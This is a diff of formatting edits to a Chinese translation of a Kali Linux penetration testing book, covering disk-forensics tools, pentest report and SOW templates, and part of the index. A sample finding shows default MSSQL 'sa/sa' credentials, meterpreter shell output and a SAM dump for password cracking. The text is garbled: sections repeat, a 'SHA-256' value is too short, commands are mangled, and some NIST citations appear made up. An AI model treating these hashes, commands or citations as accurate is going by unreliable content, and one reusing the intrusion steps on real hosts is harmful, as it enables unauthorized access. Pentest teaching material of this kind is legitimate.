-root@kali:-# sha256sum /dev/sda2 - 这是我们能够信赖的值
-c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b /dev/sda2-
 ```
 
-*
+
+
+`c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b` `CopyofDrivedcd3dd`
+
+`version_`
+
+```
+root@kali:-# sha256sum /dev/sda2
+```
+- 这是我们能够信赖的值
+
+```
+c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b /dev/sda2-
+```
 
 ### Kali 中的其他取证工具
 
@@ -5087,21 +5210,21 @@ Kali 在标记为 Forensics（取证）的类别中内置了许多取证工具�
 
 ## chkrootkit
 
-chkrootkit 可以在 Linux 系统上运行，根据签名和进程判断系统中是否存在 rootkits（根内核程序）。可以将其视为 Linux 系统的反病毒或反恶意软件软件。
+`chkrootkit` 可以在 Linux 系统上运行，根据签名和进程判断系统中是否存在 rootkits（根内核程序）。可以将其视为 Linux 系统的反病毒或反恶意软件软件。
 
-要运行 chkrootkit，请打开终端窗口并输入 `chkrootkit`。这将检查本地操作系统是否安装了任何 rootkit。
+要运行 `chkrootkit`，请打开终端窗口并输入 `chkrootkit`。这将检查本地操作系统是否安装了任何 rootkit。
 
 ```
 root@kali:~# chkrootkit
 ```
 
-Chkrootkit 是一个简单的程序，可以确保你的 Kali 没有被感染。你也可以通过在其他 Linux 发行版上安装它来运行 chkrootkit。
+`Chkrootkit` 是一个简单的程序，可以确保你的 Kali 没有被感染。你也可以通过在其他 Linux 发行版上安装它来运行 `chkrootkit`。
 
 ### Autopsy
 
-Autopsy 是一个开源数字取证工具，运行在 Windows、Linux、OS X 和其他 Unix 系统上。Autopsy 可用于分析磁盘镜像，并对 NTFS、FAT、HFS+、Ext3、UFS 等文件系统类型进行深度分析。Autopsy 最常用的用途是作为案件管理工具，用于管理对镜像文件的分析。还记得我们是如何使用 `dd` 工具创建镜像的吗？Autopsy 将帮助我们调查该镜像。
+`Autopsy` 是一个开源数字取证工具，运行在 Windows、Linux、OS X 和其他 Unix 系统上。`Autopsy` 可用于分析磁盘镜像，并对 NTFS、FAT、HFS+、Ext3、UFS 等文件系统类型进行深度分析。`Autopsy` 最常用的用途是作为案件管理工具，用于管理对镜像文件的分析。还记得我们是如何使用 `dd` 工具创建镜像的吗？`Autopsy` 将帮助我们调查该镜像。
 
-要运行 Autopsy，导航到 Kali Linux | Forensics | Digital Forensics 并选择 Autopsy。这将弹出一个终端窗口并启动应用程序。保持该窗口打开，并通过其界面使用该工具。要访问界面，请打开浏览器并导航到 http://localhost:9000/autopsy。
+要运行 `Autopsy`，导航到 Kali Linux | Forensics | Digital Forensics 并选择 `Autopsy`。这将弹出一个终端窗口并启动应用程序。保持该窗口打开，并通过其界面使用该工具。要访问界面，请打开浏览器并导航到 `http://localhost:9000/autopsy`。
 
 ## 防御性措施
 
@@ -5111,75 +5234,63 @@ Autopsy 是一个开源数字取证工具，运行在 Windows、Linux、OS X 和
 dc3dd if=/dev/sda2 of=/CopyofDrivedcd3dd_version hash=sha256
 ```
 
-dc3dd 在完成后会为被复制的驱动器的输入文件提供一个唯一的哈希值。
+`dc3dd` 在完成后会为被复制的驱动器的输入文件提供一个唯一的哈希值。
 
 ```
 dc3dd 7.1.614 started at 2013-07-06 17:32:32 -0400
+
 compiled options:
+
 command line: dc3dd if=/dev/sda2 of=/CopyofDrivedcd3dd_version hash=sha256
+
 device size: 2 sectors (probed)
+
 sector size: 512 bytes (probed)
+
 1024 bytes (1 K) copied (100%), 0.10156 s, 9.8 K/s
+
 input results for /dev/sda2:
+
 2 sectors in
+
 0 bad sectors replaced by zeros
 ...（此处省略重复输出，保持逻辑一致）
 ```
 
-Autopsy 将帮助我们调查该镜像。通过 Autopsy 界面访问工具。
+`Autopsy` 将帮助我们调查该镜像。通过 `Autopsy` 界面访问工具。
 
 我们使用 `sha256sum` 命令计算哈希。
 
 ```
 root@kali:-# sha256sum /CopyofDrivedcd3dd_version
+
 c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b CopyofDrivedcd3dd
+
 version_
-root@kali:-# sha256sum /dev/sda2 - 这是我们能够信赖的值
+
+root@kali:-# sha256sum /dev/sda2
+```
+- 这是我们能够信赖的值
+
+```
 c28635c09505425c793774a6c8e5d5e98a6b7a4cd8a9a24e6f6473d490e6b /dev/sda2-
 ```
 
-证明副本的哈希与原始文件完全匹配非常重要。如果我们对作为硬硬盘 `/dev/sda2` 的文件 `CopyofDrivedcd3dd` 计算哈希，将看到它们是匹配的。我们可以看到 dc3dd 复制的输出也是相同的。由于哈希值匹配，我们已经确认了取证调查中的文件是完全相同的。
+证明副本的哈希与原始文件完全匹配非常重要。如果我们对作为硬硬盘 `/dev/sda2` 的文件 `CopyofDrivedcd3dd` 计算哈希，将看到它们是匹配的。我们可以看到 `dc3dd` 复制的输出也是相同的。由于哈希值匹配，我们已经确认了取证调查中的文件是完全相同的。
 
-*
 
-### Kali 中的其他取证工具
 
-Kali 在标记为 Forensics（取证）的类别中内置了许多取证工具。以下是 Kali 中一些应用于 Web 应用取证的常用工具：
-
-## chkrootkit
-
-chkrootkit 可以在 Linux 系统上运行，根据签名和进程判断系统中是否存在 rootkits。可以将其视为 Linux 系统的反病毒或反恶意软件软件。
-
-要运行 chkrootkit，请打开终端窗口并输入 `chkrootkit`。这将检查本地操作系统是否安装了任何 rootkit。
-
-```
-root@kali:~# chkrootkit
-```
-
-Chkrootkit 是一个简单的程序，可以确保你的 Kali 没有被感染。你也可以通过在其他 Linux 发行版上安装它来运行 chkrootkit。
-
-### Autopsy
-
-Autopsy 是一个开源数字取证工具，运行在 Windows、Linux、OS X 和其他 Unix 系统上。Autopsy 可用于分析磁盘镜像，并对 NTFS、FAT、HFS+、Ext3、UFS 等文件系统类型进行深度分析。Autopsy 最常用的用途是作为案件管理工具，用于管理对镜像文件的分析。还记得我们是如何使用 `dd` 工具创建镜像的吗？Autopsy 将帮助我们调查该镜像。
-
-要运行 Autopsy，导航到 Kali Linux | Forensics | Digital Forensics 并选择 Autopsy。这将弹出一个终端窗口并启动应用程序。保持该窗口打开，并通过其界面使用该工具。要访问界面，请打开浏览器并导航到 http://localhost:9000/autopsy。
-
-## 防御性措施
-
-选择 New Case（新建案件）。这将显示以下内容：
-
-```
-dc3dd if=/dev/sda2 of=/CopyofDrivedcd3dd_version hash=sha256
 ```
 ...（后续内容翻译逻辑同上，保持格式一致）
+```
 
 ### Binwalk
 
-之前的截图显示管理员下载了一个二进制文件并将其重命名装成来自不同的供应商。Binwalk 能够分析该文件并提醒它这是一个固件文件，尽管该文件被重命名为 Linux 格式。
+之前的截图显示管理员下载了一个二进制文件并将其重命名装成来自不同的供应商。`Binwalk`能够分析该文件并提醒它这是一个固件文件，尽管该文件被重命名为 Linux 格式。
 
-你 可以在 https://github.com/binwalk 找到更多。
+你可以在 `https://github.com/binwalk` 找到更多。
 
-Binwalk 将输出二进制文件的结果：
+`Binwalk`将输出二进制文件的结果：
 
 | DECIMAL | HEX | DESCRIPTION |
 | :--- | :--- | :--- |
@@ -5188,17 +5299,13 @@ Binwalk 将输出二进制文件的结果：
 | 65792 | 0x10100 | firmware, ... |
 | 342636 | 0x344B3E | Secure firmware signature, version control: 0.0 |
 
-
-
-
-
 ### Scalpel
 
-Scalpel 是一种文件雕刻工具，它通过搜索已知文件头和文件尾特征的数据库，尝试从磁盘镜像中雕刻文件。在针对数据库运行它之前，需要通过配置 `scalpel.conf` 文件来指定你想要查找的文件类型。
+`Scalpel`是一种文件雕刻工具，它通过搜索已知文件头和文件尾特征的数据库，尝试从磁盘镜像中雕刻文件。在针对数据库运行它之前，需要通过配置 `scalpel.conf` 文件来指定你想要查找的文件类型。
 
 ### bulk_extractor
 
-bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电话号码、URL 和电子邮件。bulk_extractor 可以从镜像中生成用于字典攻击的词汇表。bulk_extractor 的运行可能需要几个小时，但提取出的数据对于取证分析来说，非常值得等待。
+`bulk_extractor`可以从镜像中提取各种内容，包括信用卡号、电话号码、URL 和电子邮件。`bulk_extractor`可以从镜像中生成用于字典攻击的词汇表。`bulk_extractor`的运行可能需要几个小时，但提取出的数据对于取证分析来说，非常值得等待。
 
 ## 总结
 
@@ -5213,7 +5320,7 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 
 在开始之前，我们想指出本章涉及报告撰写、条款和协议的主题。这些示例应作为通用指南。我们绝不主张拥有某种可以在法律上被接受的知识或技术。尽管我们的 Facebook 账号中有七个是律师，而且是《波士顿法律》（Boston Legal）的粉丝，但我们并不是丹尼·鹤。我们建议当你认真开始开发范围、协议和报告时，寻求专业的法律帮助。
 
-网络工程师安装网络，程序员创建应用程序，而审计员编写文档。作为一名网络渗透测试员，你默认就是一名审计员。与会配置路由协议的网络工程师或创建应用程序的程序员不同，你的价值将基于你的写作水平。换句话说，学习如何写作。写作涉及科学与艺术。如果你正试图寻找一种一致的风格，本书的作者推荐**美国语言协会格式**，即广为人知的 **MLA**。MLA 格式是一种易于使用的写作风格，被大多数中学作为写作标准。由 H. Ramsey Fowler 和 Jane E. Aaron 编写的名为 *The Little, Brown Handbook* 的参考指南，是一本关于如何在写作时正确使用 MLA 的优秀参考指南。作为一名渗透测试员，最终作为一名审计员，你提供的价值将根据你的发现是如何呈现的来评判。渗透测试报告失败的首要原因是语法错误或拼写错误。第二原因是逻辑不通或风格不当。这就是为什么我们强烈建议让与你的项目无关的人员审查你的报告，以提供局外人的视角。这可能包括非技术背景的审查人员。
+网络工程师安装网络，程序员创建应用程序，而审计员编写文档。作为一名网络渗透测试员，你默认就是一名审计员。与会配置路由协议的网络工程师或创建应用程序的程序员不同，你的价值将基于你的写作水平。换句话说，学习如何写作。写作涉及科学与艺术。如果你正试图寻找一种一致的风格，本书的作者推荐**美国语言协会格式**，即广为人知的 **MLA**。`MLA`格式是一种易于使用的写作风格，被大多数中学作为写作标准。由 H. Ramsey Fowler 和 Jane E. Aaron 编写的名为 *The Little, Brown Handbook* 的参考指南，是一本关于如何在写作时正确使用 `MLA` 的优秀参考指南。作为一名渗透测试员，最终作为一名审计员，你提供的价值将根据你的发现是如何呈现的来评判。渗透测试报告失败的首要原因是语法错误或拼写错误。第二原因是逻辑不通或风格不当。这就是为什么我们强烈建议让与你的项目无关的人员审查你的报告，以提供局外人的视角。这可能包括非技术背景的审查人员。
 
 # 渗透测试执行报告
 
@@ -5234,8 +5341,8 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 关于行业合规的重要术语如下：
 
 -   **基线 (Baselines)**：它们被用于创建满足策略需求所需的最低安全级别。基线可以是配置、架构或程序，它们可能无法反映业务流程，但可以进行调整以满足这些需求。你可以将基线作为抽象来开发标准。
-- ****标准 (Standards)**：它们是支持高层策略的强制性要求。标准可能要求使用特定的技术，包括品牌、产品和协议。一个例子是在具有自动化访问控制的基线基础上，创建一个使用 Cisco Identity Services Engine 的 802.1x 标准。
-- **指南 (Guidelines)**：它们是建议而非强制要求。可以将指南比作标准；然而，没有任何强迫人们遵循它们。一个例子是控制防火墙中开放哪些端口，而不是允许所有流量。
+-   **标准 (Standards)**：它们是支持高层策略的强制性要求。标准可能要求使用特定的技术，包括品牌、产品和协议。一个例子是在具有自动化访问控制的基线基础上，创建一个使用 Cisco Identity Services Engine 的 802.1x 标准。
+-   **指南 (Guidelines)**：它们是建议而非强制要求。可以将指南比作标准；然而，没有任何强迫人们遵循它们。一个例子是控制防火墙中开放哪些端口，而不是允许所有流量。
 
 ## 行业标准
 
@@ -5243,10 +5350,6 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 
 -   **健康保险流动性与责任法案 (HIPAA)**：它要求采取适当的控制措施，以确保医疗交易和管理信息系统保护个人身份的电子健康信息。不符合 HIPAA 规定相关的罚款风险较低；然而，不满足 HIPAA 要求可能会导致重大的附带风险，例如民事责任和品牌损害。
 -   **联邦信息处理标准 (FIPS)**：它们是美国政府机构和承包商开发的用于保护传输信息的计算机安全标准。
-
-
-
-
 
 -   联邦信息安全管理法 (FISMA) / 美国国家标准与技术研究院 (NIST)：FISMA 和 NIST 特别出版物 800-153 和 800-137 为确保支持联邦运营和资产的信息安全控制措施的有效性提供了一个全面的框架。
 
@@ -5308,10 +5411,6 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 示例 2：保密声明
 
 此机密信息作为此次咨询活动的交付物提供给服务提供商。本文的唯一目的是为客户提供此次活动的结果和建议。每位接收者都同意将根据本咨询代理与服务提供商之间的协议遵守分发限制。
-
-
-
-
 
 ## 文档控制
 
@@ -5375,7 +5474,7 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 
 示例 2：执行摘要
 
-服务提供商委托客户对其网络中指定数量的系统进行网络渗透测试。这些系统通过主机号 192.168.1.X、10.1.1.X 和 172.16.1.X 识别。合作的目的是识别并优先处理已识别系统上的安全漏洞。合作于[开始日期]启动，包括四（4）天的测试、分析和文档编制。
+服务提供商委托客户对其网络中指定数量的系统进行网络渗透测试。这些系统通过主机号 `192.168.1.X`、`10.1.1.X` 和 `172.16.1.X` 识别。合作的目的是识别并优先处理已识别系统上的安全漏洞。合作于[开始日期]启动，包括四（4）天的测试、分析和文档编制。
 
 ## 方法论
 
@@ -5404,10 +5503,6 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 漏洞评估和渗透测试总结：
 
 客户为服务提供商下表所示的八（8）个 IP 地址。该范围已被扫描，以确定相关主机上的开放端口和服务。
-
-
-
-
 
 ## 第 8 章
 
@@ -5481,30 +5576,50 @@ bulk_extractor 可以从镜像中提取各种内容，包括信用卡号、电�
 | 漏洞描述 | 与旧 EMR 数据库相关的 Microsoft SQL Server 可以默认凭据 "sa/sa" 进行访问。攻击者可以利用这些 SQL 凭据获取底层操作系统的控制权。这种访问包括文件的上传和下载、在主机上创建/读取/写入/删除文件以及创建本地用户账户 |
 
 技术细节
-服务提供对主机 100.25.5.55 执行了漏洞扫描，发现 MS 系统管理员 (sa) 账户仍使用默认密码 "sa"。截图显示服务提供使用这些凭据访问了主机。
+服务提供对主机 `100.25.5.55` 执行了漏洞扫描，发现 MS 系统管理员 (`sa`) 账户仍使用默认密码 "sa"。截图显示服务提供使用这些凭据访问了主机。
+
+```
+```
+
+
+
+### meterpreter ipconfig
 
 ```
 meterpreter > ipconfig
+
 VMWare Accelerated AMD PCNet Adapter
+
 Hardware MAC: 00:05:69:D2:1A:32
+
 IP Address : 1
+
 Netmask : 255.255.255.0
 ```
 
-服务提供继续转储 SAM 数据库的内容。该数据库由 Windows NT 用于存储和检索用户凭据。通过这些信息，我们可以运行彩虹表或进行暴力破解攻击来破解所有这些账户的密码。如果这些密码中任何一个与其他系统的密码相同，我们就可以跳转到其他系统并同样破解它们。为了验证攻击者可以打开文件，服务提供确认它可以打开主机的目录外壳（shell）。
+服务提供继续转储 `SAM` 数据库的内容。该数据库由 Windows NT 用于存储和检索用户凭据。通过这些信息，我们可以运行彩虹表或进行暴力破解攻击来破解所有这些账户的密码。如果这些密码中任何一个与其他系统的密码相同，我们就可以跳转到其他系统并同样破解它们。为了验证攻击者可以打开文件，服务提供确认它可以打开主机的目录外壳（`shell`）。
+
+### meterpreter shell
 
 ```
 meterpreter > shell
+
 Process 7924 created.
+
 Channel 1 created.
+
 Microsoft Windows (Version 5.2)
+
 (C) Copyright 1985-2003 Microsoft Corp.
 
 :\WINDOWS\system32>whoami
+
 hoami
 
 :\WINDOWS\system32>
 ```
+
+
 
 ## 渗透测试执行报告
 
@@ -5522,13 +5637,9 @@ hoami
 
 本节解释了修复所发现问题的建议。修复措施有多个级别。有时是网络架构暴露了弱点，但有时是策略、配置或缺失补丁的漏洞。建议中包含的项目有：发现总结、高级和详细的修复建议、请求之外有用数据（如 IPv6 功能、网络设计变更、硬件/软件/补丁建议以及合规性总结）。
 
-
-
-
-
 ## 渗透测试执行报告
 
-- **定期进行漏洞评估**：应定期开展漏洞评估，作为验证组织当前风险状态的手段。有关运行有效风险管理程序的指南，请参考 NIST SP 800-309。
+- **定期进行漏洞评估**：应定期开展漏洞评估，作为验证组织当前风险状态的手段。有关运行有效风险管理程序的指南，请参考 `NIST SP 800-309`。
 
 - **为关键系统和网络包含高可用性**：在评估过程中，我们发现任务关键系统存在单点故障。最佳实践是在发生网络故障时开发备备方案。改进核心数据中心流量的一个示例如下所示，通过在数据中心网络中添加冗余系统。
 
@@ -5550,13 +5661,13 @@ hoami
 
 ## 工作说明书 (SOW)
 
-在提供渗透服务之前，你可能需要编写一份工作说明书 (SOW)，概述你将要执行的工作。这通常是你在启动项目之前希望与利益相关者完成的第一步。
+在提供渗透服务之前，你可能需要编写一份工作说明书 (`SOW`)，概述你将要执行的工作。这通常是你在启动项目之前希望与利益相关者完成的第一步。
 
-在编写 SOW 时，我们建议你遵循最终将代表你报告结构的格式。工作说明书文档的基本格式包括：
+在编写 `SOW` 时，我们建议你遵循最终将代表你报告结构的格式。工作说明书文档的基本格式包括：
 
 - 执行报告：对你正在进行的工作、希望实现的目标以及你的目标受众进行高级总结。
 
-SOW 执行摘要示例如下：
+`SOW` 执行摘要示例如下：
 
 **服务提供方**很高兴向**客户**展示我们进行安全评估的方法。**客户**发起此次合作的首要目标是充分评估组织内部当前的风险水平和暴露情况，并侧重于开发和/或实施解决方案，以帮助减少关键威胁并最终降低相关风险。
 
@@ -5569,28 +5680,22 @@ SOW 执行摘要示例如下：
 此外，从此类活动中获得的见对于规划能够提高业务性能和盈利能力的未来服务至关重要。这些利益是持续的，并与列出的**客户**目标一致：
 
 - 更好地了解**客户**的网络漏洞和安全风险
-
 - 确定**客户**基础设施内的关键安全架构缺陷
-
 - 评估与**客户**网站及外部应用程序相关的安全性
 
 - 活动报告：所有已执行利用攻击的报告（提供三个级别的详细信息）。
-
 - 主机报告：详细的主机信息，包括被攻破计算机的数量、每台计算机被利用的漏洞平均数，以及每台计算机上发现的漏洞的 CVE 名称。
-
 - 漏洞报告：每台计算机上成功利用的漏洞与潜在漏洞的详细报告。
-
 - 客户端渗透测试报告：每次客户端渗透测试的完整审计追踪，包括已发送的邮件模板、启动的利用程序、测试结果（成功或失败）以及关于被攻破系统的详细信息。
-
 - 用户报告：客户端测试报告，说明哪些链接被点击、何时被点击以及由谁点击的。
 
 ## 外部渗透测试
 
-应对应来自外部源的渗透测试给予特殊考虑。外部渗透测试 SOW 识别了你的目标以及你在攻击期间愿意采取的可能步骤。SOW 还定义了你将在何时停止测试或哪些情况超出范围。换句话之，SOW 为你提供了一个停止点。
+应对应来自外部源的渗透测试给予特殊考虑。外部渗透测试 `SOW` 识别了你的目标以及你在攻击期间愿意采取的可能步骤。`SOW` 还定义了你将在何时停止测试或哪些情况超出范围。换句话之，`SOW` 为你提供了一个停止点。
 
 接下来的示例显示了外部渗透测试总结。它包含了测试过程的简要概述，随后是带有分步操作说明的工作大纲。该示例还概述了客户和应用程序所有者的责任。
 
-外部 Web 测试 SOW 示例：
+外部 Web 测试 `SOW` 示例：
 
 ## 第8 章
 
@@ -5616,13 +5721,9 @@ SOW 执行摘要示例如下：
 - 识别将进行 Web 评估的域。在渗透测试期间沟通维护和/或影响。
 - 如果不是公开可用，确保范围内的域和边界设备的 Web 可访问性。
 
-
-
-
-
 # 工作说明书（SOW）补充材料
 
-资质与工具：客户通常会验证执行审计人员所持有的资质，以及可能用于完成任务的工具。在工作说明书（SOW）中提供这些信息可以增加信誉度和专业性。预先提供潜在的工具集也可以减少在使用在使用工具产生负面影响时，客户产生负面反应的可能性。
+资质与工具：客户通常会验证执行审计人员所持有的资质，以及可能用于完成任务的工具。在工作说明书（`SOW`）中提供这些信息可以增加信誉度和专业性。预先提供潜在的工具集也可以减少在使用在使用工具产生负面影响时，客户产生负面反应的可能性。
 
 以下示例展示了一个表格，突出了渗透测试人员对将使用的工具的专长情况：
 
@@ -5712,9 +5813,9 @@ CutyCapt 用于将网页渲染捕获为位图和矢量格式，包括 SVG、PDF�
 执行摘要
 
 1.1 摘要
-CUSTOMER 已分配 SERVICE PROVIDER 执行 <domain> 的季度渗透测试任务。
+CUSTOMER 已分配 SERVICE PROVIDER 执行 `<domain>` 的季度渗透测试任务。
 
-本次渗透测试是在 <Date> 期间进行的。关于每个任务和我们发现的详细报告描述如下。
+本次渗透测试是在 `<Date>` 期间进行的。关于每个任务和我们发现的详细报告描述如下。
 
 渗透测试的目的是确定工作范围内指定的服务器的配置和 Web 应用程序的安全漏洞。测试是模拟攻击者或具有恶意意图的用户进行的。
 
@@ -5735,9 +5836,9 @@ CUSTOMER 已分配 SERVICE PROVIDER 执行 <domain> 的季度渗透测试任务�
 ## 1.2 范围
 本次渗透测试的范围限于以下 IP 地址。
 
-<IP 地址列表>
-<IP 地址列表>
-<IP 地址列表>
+`<IP 地址列表>`
+`<IP 地址列表>`
+`<IP 地址列表>`
 
 ## 1.3 关键发现
 渗透测试期间发现的关键问题总结。
@@ -5758,10 +5859,6 @@ CUSTOMER 已分配 SERVICE PROVIDER 执行 <domain> 的季度渗透测试任务�
 修复漏洞的建议。
 
 ## 1.4 建议
-
-
-
-
 
 服务提供商建议客户制定一项行动计划，以解决在此评估期间发现的问题。
 
@@ -5948,23 +6045,17 @@ Web 服务器漏洞评估
 
 我们赞扬客户通过聘请我们的服务积极管理技术风险和网络安全。由于渗透测试揭示了对整体的影响，建议分配适当资源以确保修复工作及时完成。虽然应实施的完整清单超出了本次任务的范围，但仍有一些高层次的项目需要说明：
 
-- 实施补丁管理计划：许多识别出的漏洞可以通过适当的补丁管理避免。建议使用 NIST SP 800-408 作为开发补丁管理安全策略的来源。这将减少运行漏洞系统的风险。
+- 实施补丁管理计划：许多识别出的漏洞可以通过适当的补丁管理避免。建议使用 `NIST SP 800-408` 作为开发补丁管理安全策略的来源。这将减少运行漏洞系统的风险。
 - 在所有系统中强制变更控制：常见的漏洞是由人为错误引起的。许多配置错误可以通过强大的变更控制过程避免。
 - 利用因素认证和基于角色的访问控制：发现某些关键系统仅利用安全作为验证授权人员的方法。最佳实践是使用至少两种身份验证形式，并限制管理账户访问。
-- 通过白名单、ACL、VLAN 等手段限制对关键系统的访问。最小权限设计将限制攻击者对受损资源造成的损害。请参考 NIST SP 800-27 RevA1 的指南，以实现 IT 系统的安全基础。
+- 通过白名单、ACL、VLAN 等手段限制对关键系统的访问。最小权限设计将限制攻击者对受损资源造成的损害。请参考 `NIST SP 800-27 RevA1` 的指南，以实现 IT 系统的安全基础。
 
 ## 风险评分
 
 服务提供商为客户识别的整体风险分为“关键”到“低”级，定义如下。服务提供商识别了三个关键漏洞，并用于访问客户的内部网络。
 
 - 关键：对关键业务流程的直接威胁
-
 - 高：对关键业务流程的间接威胁/对次要业务流程的威胁
-
-
-
-
-
 - **Medium**：对业务流程构成间接/部分威胁
 - **Low**：不存在直接威胁；漏洞可能与其他漏洞结合利用
 
@@ -5986,11 +6077,11 @@ Web 服务器漏洞评估
 
 ## 符号
 
-- -t option 55
+- `-t option` 55
 
 ## A
 
-- - acccheck 209
+- `- acccheck` 209
 - 活动报告 296
 - Alerts标签页，Owasp-Zap 92
 - 预期年化损失 (ALE) 15
@@ -5998,8 +6089,8 @@ Web 服务器漏洞评估
 - 附录 294
 - 应用交付控制器 (ADC) 设备 264
 - 应用程序层攻击 236
-- apt-get update 命令 212
-- arpspoof 193, 194
+- `apt-get update` 命令 212
+- `arpspoof` 193, 194
 - 资产价值 (AV) 15
 - 场景，使用 Scapy 238, 240
 - 资产设置标签页，WebSlayer 314
@@ -6011,7 +6102,7 @@ Web 服务器漏洞评估
 - DirBuster 110-112
 - Hydra 107
 - WebSlayer 113-119
-- bulk_extractor 276
+- `bulk_extractor` 276
 - BURP Proxy 约 218-221
 - Burp Spider 221
 - 爬虫功能，使用 222-225
@@ -6020,8 +6111,8 @@ Web 服务器漏洞评估
 ## B
 
 - - BeEF 212
-- apt-get update 命令 212
-- hook.js 214
+- `apt-get update` 命令 212
+- `hook.js` 214
 - 安装 212
 - 启动 212
 - URL 212
@@ -6064,14 +6155,13 @@ Web 服务器漏洞评估
 - 识别的会话 187
 - 字典攻击 152
 - 会话请求信息 187
-- dictsat
+- `dictsat`
 - Cookie 防御 263
 - 关于 172
 - Dig (域名信息查询工具) 54
 - 数字取证 265, 266
 - 会话劫持攻击，限制性 179
 - DirBuster
-- 窃取 179
 - 关于 110-112
 - 报告按钮 113
 - Cookies Manager+ 183
@@ -6080,8 +6170,7 @@ Web 服务器漏洞评估
 - DNS
 - 爬虫标签页，Proxy 84
 - 目标，识别 55, 57
-- creddump 174
-- DNS 245, 246
+- `creddump` 174
 - 凭据 299
 - 关键基础设施保护 (CIP) 280
 - 技术 54, 55
@@ -6098,14 +6187,14 @@ Web 服务器漏洞评估
 - 点击劫持防御 263, 264
 - Driftnet 198
 - 拒绝服务防御 262
-- dsniff
+- `dsniff`
 - 中间人防御 259
 - 开始 195
 
 ## D
 
 - - 电子数据收集、分析与检索 (EDGAR) 40
-- get 105-107
+- `get` 105-107
 - Ettercap
 - 关于 196
 - 执行摘要 285, 286
@@ -6114,7 +6203,7 @@ Web 服务器漏洞评估
 - 漏洞利用工具 30
 - Exploit 标签页，w3af 104
 - 伪 DNS 245
-- fdisk -l
+- `fdisk -l`
 - 联邦监管委员会 (FERC) 280
 - 联邦信息处理标准 (FIPS) 279
 - 联邦信息安全法 (FISMA) 280
@@ -6125,14 +6214,14 @@ Web 服务器漏洞评估
 - 使用 Kali 267-269
 - Fimap
 - 使用 234
-- findmyhash 173
+- `findmyhash` 173
 - Firefox 插件
 - 关于 180
-- arppo 193, 194
+- `arppo` 193, 194
 - Cookie Dodger 182
 - Cookie Inject 182
 - Cookies Manager+ 183
-- dsniff 193-195
+- `dsniff` 193-195
 - Ettercap 196-198
 - Firesheep 180
 - Greasmonkey 182
@@ -6152,15 +6241,15 @@ Web 服务器漏洞评估
 - 取证工具 271
 - Autopsy 271-274
 - Binwalk 274
-- bulk_extractor 276
-- chkrootkit 271
+- `bulk_extractor` 276
+- `chkrootkit` 271
 - Foremost 275
 - Pasco 275
-- pdf-parser 275
+- `pdf-parser` 275
 - Scalpel 276
 - FoxProxy
 - 代理，添加 217
-- fping 命令 53
+- `fping` 命令 53
 
 ## G
 
@@ -6183,11 +6272,11 @@ Web 服务器漏洞评估
 
 - - Hamster 190-192
 - 硬件攻击 31
-- hashcat 159
+- `hashcat` 159
 - Hash-identifier 170
 - 哈希处理 152
 - 健康保险流通与责任法 (HIPAA) 253, 279
-- hexint 209
+- `hexint` 209
 - 主机扫描 关于 144
 - 使用 Ness 145
 - Hosts 标签页，NMap 64
@@ -6240,7 +6329,7 @@ Web 服务器漏洞评估
 ## I
 
 - ICMP 侦察技术 52, 53
-- ifconfig 命令 122
+- `ifconfig` 命令 122
 - 行业合规基线 279
 - 指南 279
 - 标准 279
@@ -6254,10 +6343,6 @@ Web 服务器漏洞评估
 - 入侵检测/防御 (IDS/IPS) 305
 - Inundator 248
 - 使用 iptables，用于设置端口重定向 124-126
-
-
-
-
 
 ## 报告工具 31
 - 逆向工程 30
@@ -6356,13 +6441,13 @@ Web 服务器漏洞评估
   - 工具 20
   - 密码破解工具, Kali
     - 关于 155
-    - chntpw 161-164
+    - `chntpw` 161-164
     - Crunch 166, 169
-    - hashcat 159
+    - `hashcat` 159
     - Johnny 156, 158
-    - ocDhashcat 165, 166
+    - `ocDhashcat` 165, 166
     - Ophrack 165, 167
-    - sandump2 161
+    - `sandump2` 161
   - 密码
     - 关于 119
     - 破解 151
@@ -6376,7 +6461,7 @@ Web 服务器漏洞评估
 - Paylander 生成器, WebSlayer 114
 - 支付应用数据安全标准 (PA-DSS) 280
 - 支付行业身份数据安全标准 (PCI DSS) 253, 280
-- pdf-parser 275
+- `pdf-parser` 275
 - 渗透测试报告 277, 278
 - 渗透测试
   - 关于 7, 8, 16
@@ -6386,9 +6471,9 @@ Web 服务器漏洞评估
   - 白盒测试 9, 10
   - 工作, 范围 11
 - 个人身份验证 (PIV) 176
-- phrasedrescher 173
+- `phrasedrescher` 173
 - 物理地址扩展 (PAE) 221
-- ping 命令 52
+- `ping` 命令 52
 - NMap, Ping 标签 63
 - ProxyStrike, 插件标签 84
 - 端口转发选项 135
@@ -6543,384 +6628,6 @@ Web 服务器漏洞评估
 - 区域注册机构。参阅 RIRs
 - 执行 285, 286
 - 时间线 284
-- 安全套层 (SSL) 协议 236
-- 安全审计 133
-- 报告按钮, DirBuster 113
-- 报告格式
-- 附录 294
-- 保密性声明 283
-- 页面 283
-- 文档控制 284
-- 执行摘要 285, 286
-- 发现 289
-- 方法论 286, 287
-- 网络, 连接 292, 293
-- 网络, 建议 292, 293
-- 详细程序 288
-- 时间线 284
-- 敏感信息设施 (SCIF) 283
-- 服务器 73
-- 服务端攻击 74
-- 服务命令 98
-- 会话耗尽 236
-- 会话管理
-  - 关于 177
-  - 漏洞 290, 292
-- 报告工具 31
-- Kali, 报告工具
-- KeepNote 301
-- MagicTree 301
-- Maltego casefile 301
-- 示例报告 302-310
-- SET
-  - 关于 130, 131, 230, 231
-  - 伪邮件发送 141, 142
-  - mpreter 139
-  - 设置 131, 132
-  - Site Cloner 140
-  - 模板, 选择 232
-  - 用户, 输入 233
-  - 使用攻击 132-134
-  - 使用, 克隆 132-134
-- SET 密码采集。参阅 SET
-- Shodan 42
-- 会话劫持 190
-- Siege 247
-- 单次损失预期。SLE
-- Site Cloner 140
-- Owasp-Zap, 站点窗口 91
-- Skipfish
-  - 关于 78, 80
-  - 命令选项 78
-- Owasp-Zap, 报告标签 94
-- 报价请求 (RFP) 关于 281
